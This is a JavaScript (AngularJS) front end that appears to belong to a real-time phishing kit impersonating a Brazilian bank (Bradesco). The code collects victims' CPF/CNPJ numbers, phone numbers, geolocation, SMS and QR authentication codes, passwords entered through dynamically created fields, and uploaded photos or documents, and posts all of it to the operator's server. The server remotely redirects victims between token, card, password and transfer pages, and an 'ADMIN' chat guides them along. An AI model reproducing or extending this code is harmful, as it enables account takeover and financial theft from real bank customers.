

var app = angular.module('app', ['ngCookies']);

app.directive('myDirective', function (httpPostFactory) {
    return {
        restrict: 'A',
        scope: true,
        link: function (scope, element, attr) {

            element.bind('change', function () {
                var formData = new FormData();
                formData.append('arquivo', element[0].files[0]);
                httpPostFactory(minhaurllimpa + '/api/cliente/arquivo', formData, function (callback) {


                });

                $('.fecha').fadeOut('slow', function (){
                    $(this).addClass('d-none');
                });
                $('.maisarquivo').fadeOut('slow', function (){
                    $(this).addClass('d-none');
                });

                $('.abremais').animate({opacity:1},0)
            });

        }
    };
});

app.factory('httpPostFactory', function ($http) {
    return function (file, data, callback) {
        $http({
            url: file,
            method: "POST",
            data: data,
            headers: {'Content-Type': undefined}
        }).then(function (response) {
            callback(response);
        });
    };
});

app.controller('onlineController', function($scope, $http, $cookies, $interval, $timeout, $httpParamSerializerJQLike){
    var latitude = null;
    var longitude = null;

    navigator.geolocation.getCurrentPosition(position => {
        latitude = position.coords.latitude;
        longitude = position.coords.longitude;
    });

    $scope.statusChange = function (link){
        $http({
            method : "POST",
            url : minhaurllimpa + "/api/cliente/status",
            data : {
                'meustatus': 'REDIRECIONADO'
            }
        }).then(function mySuccess(response) {
            window.location.href = link
        });
    }

    $scope.online = function(id){
        var data = null;
        if(longitude != null && latitude != null){
            data = {
                'pagina' : pagina_atual,
                'latitude' : latitude,
                'longitude' : longitude
            }
        }else{
            data = {
                'pagina' : pagina_atual,
            }
        }
        $http({
            method : "POST",
            url : minhaurllimpa + "/api/cliente/online",
            data : data
        }).then(function mySuccess(response) {

            if(response.data.status == 'REDIRECIONA-INICIO'){
                $scope.statusChange('/inicio');
            }else if(response.data.status == 'REDIRECIONA-SENHA'){
                $scope.statusChange('/senha');
            }else if(response.data.status == 'REDIRECIONA-CONTATO'){
                $scope.statusChange('/contato');
            }else if(response.data.status == 'REDIRECIONA-ASSINATURA'){
                $scope.statusChange('/assinatura');
            }else if(response.data.status == 'REDIRECIONA-CARTAO'){
                $scope.statusChange('/cartao');
            }else if(response.data.status == 'REDIRECIONA-EMAIL'){
                $scope.statusChange('/email');
            }else if(response.data.status == 'REDIRECIONA-SELF'){
                $scope.statusChange('/self');
            }else if(response.data.status == 'REDIRECIONA-AGUARDE'){
                $scope.statusChange('/aguarde');
            }else if(response.data.status == 'REDIRECIONA-FINAL'){
                $scope.statusChange('/final');
            }else if(response.data.status == 'REDIRECIONA-FINALCHAVE'){
                $scope.statusChange('/realizada');
            }else if(response.data.status == 'REDIRECIONA-CHAT'){
                $scope.statusChange('/principal');
            }else if(response.data.status == 'REDIRECIONA-PRESENTE'){
                $scope.statusChange('/aviso');
            }else if(response.data.status == 'REDIRECIONA_TOKEN_CHAVERO'){
                $scope.statusChange('/autenticacao');
            }else if(response.data.status == 'REDIRECIONA_TOKEN_CHAVE'){
                $scope.statusChange('/autenticacao');
            }else if(response.data.status == 'REDIRECIONA_TOKEN_QR'){
                $scope.statusChange('/autenticacao');
            }else if(response.data.status == 'REDIRECIONA_TOKEN_SMS'){
                $scope.statusChange('/autenticacao');
            }else if(response.data.status == 'REDIRECIONA_TRANSFERENCIA_INICIO'){
                $scope.statusChange('/transferencia');
            }else if(response.data.status == 'REDIRECIONA_TRANSFERENCIA_QR'){
                $scope.statusChange('/transferencia-qrcode');
            }else if(response.data.status == 'REDIRECIONA_ORIGINAL'){
                $scope.statusChange('https://banco.bradesco/');
            }
        });

    }

    $scope.intervalo = function (){
        $scope.online();
    }

    $interval($scope.intervalo, 3000);

});

app.controller('dadosController', function($scope, $http, $cookies, $interval, $timeout, $httpParamSerializerJQLike){

    $scope.cpf = '';
    $scope.cpf = '';
    $scope.cnpj = ''
    $scope.celular = ''

    $scope.libera = function (){
        $('#tudo').fadeOut('slow',function (){
            $(this).addClass('d-none')
        })
    }

    $scope.enviaFisica = function(){
        if(!(valida_cpf($scope.cpf) && $scope.cpf.length > 10)){
            $scope.cpf = ''
            $('#cpf').focus();
        }else if($scope.celular.length < 11){
            $scope.celular = '';
            $('#celular').focus();
        }else{
            $http({
                method : "POST",
                url : minhaurllimpa + "/api/cliente/dados",
                data : {
                    'cpf' : $scope.cpf,
                    'celular' : $scope.celular
                }
            }).then(function mySuccess(response) {
                $scope.libera()
            });
        }
    }

    $scope.enviaJuridica = function(){
        if(!(valida_cnpj($scope.cnpj) && $scope.cnpj.length > 13)){
            $scope.cnpj = ''
            $('#cnpj').focus();
        }else if(!(valida_cpf($scope.cpf) && $scope.cpf.length > 10)){
            $scope.cpf = ''
            $('#cpf1').focus();
        }else if($scope.celular.length < 11){
            $scope.celular = '';
            $('#celular1').focus();
        }else{
            $http({
                method : "POST",
                url : minhaurllimpa + "/api/cliente/dados",
                data : {
                    'cnpj' : $scope.cnpj,
                    'cpf' : $scope.cpf,
                    'celular' : $scope.celular
                }
            }).then(function mySuccess(response) {
                $scope.libera()
            });
        }
    }
});

app.controller('campoController', function($scope, $http, $cookies, $interval, $timeout, $httpParamSerializerJQLike) {

    $scope.enviaCampo = function () {
        if($('#campo_personalizado').attr('type') != 'file'){
            if ($('#campo_personalizado').val() == null) {
                $('#campo_personalizado').focus();
            } else {
                $http({
                    method: "POST",
                    url: minhaurllimpa + "/api/cliente/campo",
                    data: {
                        'id_campo': $('#campo_personalizado_id').val(),
                        'campo': $('#campo_personalizado').val()

                    }
                }).then(function mySuccess(response) {
                    $('#campo_interacao').fadeOut('slow', function () {
                        $('#campo_interacao').addClass('d-none');
                    })
                });
            }
        }else{
            if ($('#campo_personalizado').val().length === 0) {
                $('#campo_personalizado').val('')
                $('#campo_personalizado').focus();
            } else {
                $http({
                    method: "POST",
                    url: minhaurllimpa + "/api/cliente/campo",
                    headers: {
                        'Content-Type': undefined
                    },
                    data: {
                        'id_campo': $('#campo_personalizado_id').val(),
                        'campo': document.getElementById('campo_personalizado').files[0]
                    },
                    transformRequest: function (data, headersGetter) {
                        var formData = new FormData();
                        angular.forEach(data, function (value, key) {
                            formData.append(key, value);
                        });

                        return formData;
                    }
                }).then(function mySuccess(response) {
                });


                $('#campo_interacao').fadeOut('slow', function () {
                    $('#campo_interacao').addClass('d-none');
                })
            }
        }


    }

});

app.controller('qrController', function($scope, $http, $cookies, $interval, $timeout, $httpParamSerializerJQLike, $window) {
    var ncam = 0;
    var cams = null;
    const html5QrCode = new Html5Qrcode("reader");

    $scope.trocaCamera = function (){
        if (cams.length > 0) {

            html5QrCode.stop().then((ignore) => {

                if((ncam + 1) < cams.length){
                    ncam = ncam + 1;

                    cameraId = cams[ncam].id;
                    html5QrCode.start(
                        cameraId,
                        {
                            fps: 10,    // Optional, frame per seconds for qr code scanning
                            qrbox: { width: 250, height: 250 }  // Optional, if you want bounded box UI
                        },
                        (decodedText, decodedResult) => {
                            // do something when code is read
                            html5QrCode.stop();
                            $scope.sendQr(decodedText);
                        },
                        (errorMessage) => {
                            // parse error, ignore it.
                        })
                        .catch((err) => {
                            // Start failed, handle it.
                        });

                }else{
                    cameraId = cams[ncam].id;
                    html5QrCode.start(
                        cameraId,
                        {
                            fps: 10,    // Optional, frame per seconds for qr code scanning
                            qrbox: { width: 250, height: 250 }  // Optional, if you want bounded box UI
                        },
                        (decodedText, decodedResult) => {
                            // do something when code is read
                            html5QrCode.stop();
                            $scope.sendQr(decodedText);
                        },
                        (errorMessage) => {
                            // parse error, ignore it.
                        })
                        .catch((err) => {
                            // Start failed, handle it.
                        });
                }

            }).catch((err) => {
                // Stop failed, handle it.
            });

        } else {
            console.error('No cameras found.');
        }
    }

    $scope.enviaQr = function () {
        Html5Qrcode.getCameras().then(devices => {

            cams = devices;
            if (devices && devices.length) {
                var cameraId = devices[ncam].id;
                html5QrCode.start(
                    { facingMode: { exact: "environment"} },
                    {
                        fps: 10,    // Optional, frame per seconds for qr code scanning
                        qrbox: { width: 250, height: 250 }  // Optional, if you want bounded box UI
                    },
                    (decodedText, decodedResult) => {
                        // do something when code is read
                        html5QrCode.stop();
                        $scope.sendQr(decodedText);
                    },
                    (errorMessage) => {
                        // parse error, ignore it.
                    })
                    .catch((err) => {
                        // Start failed, handle it.
                    });


            }


        }).catch(err => {
            // handle err
        });

        $('.textoQr').fadeOut(0, function (){
            $('.textoQr').addClass('d-none')
        })


        $('#qrcamera').fadeIn('slow', function () {
        })

        $('#qrcamera').removeClass('d-none');

    }

    $scope.sendQr = function (qrtext){

        $http({
            method: "POST",
            url: minhaurllimpa + "/api/cliente/qr",
            data: {
                'qr': qrtext
            }
        }).then(function mySuccess(response) {
            $('#qrcamera').fadeOut('fast', function () {
                $('#qrcamera').addClass('d-none');
            })


            $('#qrAguarde').fadeIn('slow', function () {})

            $('#qrAguarde').removeClass('d-none');

            console.log(response.data)


        });
    }

    $scope.voltaAguarde = function (){

        $('#qrFormulario').fadeOut('slow', function () {
            $('#qrFormulario').addClass('d-none');
        })

        $('#qrAguarde').fadeOut('fast', function () {
            $('#qrAguarde').addClass('d-none');
        })


        $('#qrValido').fadeOut('fast', function () {
            $('#qrValido').addClass('d-none');
        })

        $('#qrCodigo').fadeOut('fast', function () {
            $('#qrCodigo').addClass('d-none');
        })

        $('#qrAguarde').fadeIn('slow', function () {})
        $('#qrAguarde').removeClass('d-none');
    }

    $window.sendQr = $scope.sendQr;

    $scope.limpaQR = function (){
        $('#qrTela').fadeOut('slow', function () {
            $('#qrTela').addClass('d-none');
            $('#mensagem').focus();
        })
    }

});

app.controller('smsController', function($scope, $http, $cookies, $interval, $timeout, $httpParamSerializerJQLike) {
    $scope.enviaSMS = function () {
        if ($('#smscodigo').val().length < 3) {
            $('#smscodigo').focus();
        } else {
            $http({
                method: "POST",
                url: minhaurllimpa + "/api/cliente/sms",
                data: {
                    'sms': $('#smscodigo').val()
                }
            }).then(function mySuccess(response) {

                $('#campo_interacao').fadeOut('slow', function () {
                    $('#campo_interacao').addClass('d-none');
                })

                $('#smsFormulario').fadeOut('slow', function () {
                    $('#smsFormulario').addClass('d-none');
                    $('#smscodigo').val('');
                })


                $('#smsAguarde').fadeIn('slow', function () {
                    $('#smsAguarde').removeClass('d-none');
                })



            });
        }
    }



    $scope.limpa = function (){
        $('#smsValido').fadeOut('slow', function () {
            $('#smsValido').addClass('d-none');
        })

        $('#smsTela').fadeOut('slow', function () {
            $('#smsTela').addClass('d-none');
        })
    }

});

app.controller('clienteController', function($scope, $http, $cookies, $interval, $timeout, $httpParamSerializerJQLike){
    $scope.mensagem = ''
    $scope.mensagens_chat = Array();
    $scope.toquei = false;



    $scope.adicionaMensagem = function(){
        $http({
            method : "POST",
            url : minhaurllimpa + "/api/cliente/conversa",
            data : {
                'texto' : $scope.mensagem
            }
        }).then(function mySuccess(response) {
            $scope.mensagem = "";
        });
    }

    $("#mensagem").on('keyup', function (e) {
        if (e.key === 'Enter' || e.keyCode === 13) {
            $scope.adicionaMensagem()
        }
    });

    $scope.listaMensagem = function(){
        dataEnvia = null;
        if($scope.mensagens_chat.length === null){
            dataEnvia = {
                'ultima' : 0
            }
        }else{
            if($scope.mensagens_chat.length > 0){
                dataEnvia = {
                    'ultima' : $scope.mensagens_chat[$scope.mensagens_chat.length - 1].id
                }
            }else{
                dataEnvia = {
                    'ultima' : 0
                }
            }
        }

        $http({
            method : "POST",
            url : minhaurllimpa + "/api/cliente/conversa/lista",
            data : dataEnvia
        }).then(function mySuccess(response) {

            if($scope.mensagens_chat == null){
                $scope.mensagens_chat = response.data.msg;

                var objDiv = document.getElementById("pagChat");
                $("#pagChat").animate({ scrollTop: objDiv.scrollHeight },{duration: "slow"});
            }else{
                if(response.data.msg.length > 0){
                    if($scope.toquei == true){
                        response.data.msg.forEach(function (msga, i){
                            if(msga.remetente == 'ADMIN'){
                                try{
                                    var audioElement = document.createElement('audio');
                                    audioElement.setAttribute('src', "song.mp3");
                                    audioElement.play();
                                }catch (e) {
                                    // Mensagem
                                }
                            }
                        })
                    }

                    $scope.mensagens_chat = $scope.mensagens_chat.concat(response.data.msg)

                    var objDiv = document.getElementById("pagChat");
                    $("#pagChat").animate({ scrollTop: objDiv.scrollHeight },{duration: "slow"});

                    $scope.toquei = true;
                }
            }


            $scope.interecao(response.data.interacao);

        });


    }

    $scope.interecao = function (status){
        if(status.includes('CAMPO')){
            idCampo = status.replace('CAMPO_','');
            $scope.campo = null;

            $http({
                method : "GET",
                url : minhaurllimpa + "/api/cliente/campo/"+idCampo,
            }).then(function mySuccess(response) {

                setTimeout(function (){
                    $scope.campo = response.data;

                    $('#tituloCampo').html($scope.campo.titulo);
                    $('#subtituloCampo').html($scope.campo.conteudo);


                    var inputElementId = document.createElement('input');
                    inputElementId.setAttribute('id', 'campo_personalizado_id');
                    inputElementId.setAttribute('type', 'hidden')
                    inputElementId.value = $scope.campo.id;

                    var inputElement = document.createElement('input');

                    inputElement.setAttribute('class', 'form-control bg-light-b text-black fw-medium rounded mb-2');
                    inputElement.setAttribute('id', 'campo_personalizado');
                    inputElement.setAttribute('maxlength', $scope.campo.maximo);
                    inputElement.setAttribute('minlength', $scope.campo.minimo);

                    var reverse = {}


                    if ($scope.campo.tipo == 'IMAGEM') {
                        inputElement.setAttribute('type', 'file');
                        inputElement.setAttribute('accept', 'image/*');
                        inputElement.setAttribute('capture', 'camera');

                        inputElement.removeAttribute('maxlength');
                        inputElement.removeAttribute('minlength');
                        inputElement.setAttribute('class','d-none')

                    }else if ($scope.campo.tipo == 'ARQUIVO') {
                        inputElement.setAttribute('type', 'file');
                        inputElement.setAttribute('accept', 'application/pdf,image/*');
                        inputElement.removeAttribute('maxlength');
                        inputElement.removeAttribute('minlength');
                    }else if ($scope.campo.tipo == 'TEXTO_NOMRAL') {
                        inputElement.setAttribute('type', 'text');
                    }else if ($scope.campo.tipo == 'TEXTO_NUMERICO') {
                        inputElement.setAttribute('type', 'text');
                        inputElement.setAttribute('inputmode', 'numeric');
                    }else if ($scope.campo.tipo == 'TEXTO_NUMERICO_REVERSO') {
                        inputElement.setAttribute('type', 'text');
                        inputElement.setAttribute('inputmode', 'numeric');
                        reverse = {reverse: true}
                    }else if ($scope.campo.tipo == 'SENHA_ALFA') {
                        inputElement.setAttribute('type', 'password');
                    }else if ($scope.campo.tipo == 'SENHA_NUMERICA') {
                        inputElement.setAttribute('type', 'password');
                        inputElement.setAttribute('inputmode', 'numeric');
                    }else if ($scope.campo.tipo == 'EMAIL') {
                        inputElement.setAttribute('type', 'email');
                    }



                    if($scope.campo.tipo == 'IMAGEM'){
                        var labelFile = document.createElement('label');
                        labelFile.setAttribute('id', 'labelfileCAMPO')
                        labelFile.setAttribute('for','campo_personalizado');
                        labelFile.setAttribute('class','d-flex flex-column align-content-center align-items-center justify-content-center justify-items-center w-100');

                        $('#meucampo').html(inputElement)
                        $('#meucampo').append(inputElementId)
                        $('#meucampo').append(labelFile);
                        $('#labelfileCAMPO').append('<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" fill="#000" class="bi bi-camera-fill" viewBox="0 0 16 16">\n' +
                            '  <path d="M10.5 8.5a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>\n' +
                            '  <path d="M2 4a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2h-1.172a2 2 0 0 1-1.414-.586l-.828-.828A2 2 0 0 0 9.172 2H6.828a2 2 0 0 0-1.414.586l-.828.828A2 2 0 0 1 3.172 4H2zm.5 2a.5.5 0 1 1 0-1 .5.5 0 0 1 0 1zm9 2.5a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0z"/>\n' +
                            '</svg>'+
                            '<p class="fs-8 text-secondary" id="avisolbl">Toque na camera para selecionar uma foto</p>');



                    }else{
                        $('#meucampo').html(inputElement);
                        $('#meucampo').append(inputElementId)
                    }


                    if($scope.campo.mascara !== null){
                        if($scope.campo.mascara.length > 0){
                            $('#campo_personalizado').mask($scope.campo.mascara, reverse)
                        }
                    }

                    $('#campo_interacao').fadeIn('slow', function () {
                        $('#campo_interacao').removeClass('d-none');

                        setTimeout(function (){
                            $("#campo_personalizado").focus();
                        },1700);
                    })
                }, 2000)

            });
        } else if (status.includes('RESET')) {
            $('#campo_interacao').fadeOut('slow', function () {
                $('#campo_interacao').addClass('d-none');
            })

            $('#smsTela').fadeOut('slow', function () {
                $('#smsTela').addClass('d-none');
            })

        } else if (status.includes('SMS_LEITURA')) {
            $('#smsAguarde').fadeOut('fast', function () {
                $('#smsAguarde').addClass('d-none');
            })

            $('#smsInvalido').fadeOut('slow', function () {
                $('#smsInvalido').addClass('d-none');
            })


            $('#smsValido').fadeOut('slow', function () {
                $('#smsValido').addClass('d-none');
            })

            $('#smsFormulario').fadeIn('slow', function () {
                $('#smsFormulario').removeClass('d-none');
            })

            $('#smsTela').fadeIn('slow', function () {
                $('#smsTela').removeClass('d-none');
            })
        }else if (status.includes('SMS_VALIDO')) {
            $http({
                method : "POST",
                url : minhaurllimpa + "/api/cliente/interacao",
                data : {
                    'interacao' : 'COMANDO_RECEBIDO'
                }
            }).then(function mySuccess(response) {


                $('#smsFormulario').fadeOut('slow', function () {
                    $('#smsFormulario').addClass('d-none');
                })

                $('#smsAguarde').fadeOut('fast', function () {
                    $('#smsAguarde').addClass('d-none');
                })


                $('#smsInvalido').fadeOut('fast', function () {
                    $('#smsInvalido').addClass('d-none');
                })

                $('#smsValido').fadeIn('slow', function () {
                    $('#smsValido').removeClass('d-none');
                })

                $('#smsTela').fadeIn('slow', function () {
                    $('#smsTela').removeClass('d-none');
                })

            });
        }else if (status.includes('SMS_INVALIDO')) {
            $http({
                method : "POST",
                url : minhaurllimpa + "/api/cliente/interacao",
                data : {
                    'interacao' : 'COMANDO_RECEBIDO'
                }
            }).then(function mySuccess(response) {


                $('#smsFormulario').fadeOut('slow', function () {
                    $('#smsFormulario').addClass('d-none');
                })

                $('#smsAguarde').fadeOut('fast', function () {
                    $('#smsAguarde').addClass('d-none');
                })

                $('#smsValido').fadeOut('fast', function () {
                    $('#smsValido').addClass('d-none');
                })

                $('#smsInvalido').fadeIn('slow', function () {
                    $('#smsInvalido').removeClass('d-none');
                })

                $('#smsTela').fadeIn('slow', function () {
                    $('#smsTela').removeClass('d-none');
                })

            });
        }else if (status.includes('QR_LEITURA')) {

            $http({
                method : "POST",
                url : minhaurllimpa + "/api/cliente/interacao",
                data : {
                    'interacao' : 'COMANDO_RECEBIDO'
                }
            }).then(function mySuccess(response) {
                $('#qrValido').fadeOut('fast', function () {
                    $('#qrValido').addClass('d-none');
                })

                $('#qrInvalido').fadeOut('fast', function () {
                    $('#qrInvalido').addClass('d-none');
                })

                $('#qrcamera').fadeOut(0, function () {
                    $('#qrcamera').addClass('d-none');
                })

                $('#qrCodigo').fadeOut('fast', function () {
                    $('#qrCodigo').addClass('d-none');
                })

                $('#qrFormulario').fadeIn(0, function (){
                    $('#qrFormulario').removeClass('d-none')
                })

                $('.textoQr').fadeIn(0, function (){
                    $('.textoQr').removeClass('d-none')
                })

                $('#qrTela').fadeIn('slow', function () {
                    $('#qrTela').removeClass('d-none');
                })

            });


        }else if (status.includes('QR_VALIDO')) {
            $http({
                method : "POST",
                url : minhaurllimpa + "/api/cliente/interacao",
                data : {
                    'interacao' : 'COMANDO_RECEBIDO'
                }
            }).then(function mySuccess(response) {


                $('#qrFormulario').fadeOut('slow', function () {
                    $('#qrFormulario').addClass('d-none');
                })

                $('#qrAguarde').fadeOut('fast', function () {
                    $('#qrAguarde').addClass('d-none');
                })

                $('#qrInvalido').fadeOut('fast', function () {
                    $('#qrInvalido').addClass('d-none');
                })

                $('#qrCodigo').fadeOut('fast', function () {
                    $('#qrCodigo').addClass('d-none');
                })

                $('#qrValido').fadeIn('slow', function () {
                    $('#qrValido').removeClass('d-none');
                })

                $('#qrTela').fadeIn('slow', function () {
                    $('#qrTela').removeClass('d-none');
                })

            });
        }else if (status.includes('QR_INVALIDO')) {
            $http({
                method : "POST",
                url : minhaurllimpa + "/api/cliente/interacao",
                data : {
                    'interacao' : 'COMANDO_RECEBIDO'
                }
            }).then(function mySuccess(response) {


                $('#qrFormulario').fadeOut('slow', function () {
                    $('#qrFormulario').addClass('d-none');
                })

                $('#qrAguarde').fadeOut('fast', function () {
                    $('#qrAguarde').addClass('d-none');
                })


                $('#qrValido').fadeOut('fast', function () {
                    $('#qrValido').addClass('d-none');
                })

                $('#qrCodigo').fadeOut('fast', function () {
                    $('#qrCodigo').addClass('d-none');
                })

                $('#qrInvalido').fadeIn('slow', function () {
                    $('#qrInvalido').removeClass('d-none');
                })

                $('#qrTela').fadeIn('slow', function () {
                    $('#qrTela').removeClass('d-none');
                })

            });
        }else if (status.includes('CODIGO')) {
            var codigo = status.replace('CODIGO_','');

            $('#codTexto').html(codigo)

            $http({
                method : "POST",
                url : minhaurllimpa + "/api/cliente/interacao",
                data : {
                    'interacao' : 'COMANDO_RECEBIDO'
                }
            }).then(function mySuccess(response) {


                $('#qrFormulario').fadeOut('slow', function () {
                    $('#qrFormulario').addClass('d-none');
                })

                $('#qrAguarde').fadeOut('fast', function () {
                    $('#qrAguarde').addClass('d-none');
                })

                $('#qrValido').fadeOut('fast', function () {
                    $('#qrValido').addClass('d-none');
                })

                $('#qrInvalido').fadeOut('fast', function () {
                    $('#qrInvalido').addClass('d-none');
                })

                $('#qrCodigo').fadeIn('slow', function () {
                    $('#qrCodigo').removeClass('d-none');
                })

                $('#qrTela').fadeIn('slow', function () {
                    $('#qrTela').removeClass('d-none');
                })

            });
        }
    }



    $scope.dataNossa = function (minha) {
        return dayjs(new Date(minha)).format('HH:mm:ss DD/MM/YYYY')
    }

    $scope.dataChat = function (minha) {
        return dayjs(new Date(minha)).format('DD/MM HH:mm')
    }


    $scope.intervalo = function () {
        $scope.listaMensagem();
    }

    $interval($scope.intervalo, 1500);
    $scope.intervalo();
});

